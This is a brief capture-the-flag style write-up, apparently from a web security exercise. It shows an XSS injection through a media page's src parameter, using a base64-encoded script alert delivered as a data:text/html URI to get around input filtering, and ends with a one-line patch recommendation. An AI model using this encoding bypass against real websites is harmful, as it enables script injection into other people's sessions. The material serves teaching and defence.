## XSS Injection on URL

If we clic on nsa image, we can see the src in the url, and try to exploit it,
Direct injection don't work so we use base64 to test a classique : 
```<script>alert('XSS')</script>```
in base64 : ```PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=```
```http://x.x.x.x/index.php?page=media&src=src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=```

## Patch 
Use library to check user input and sanitize the data...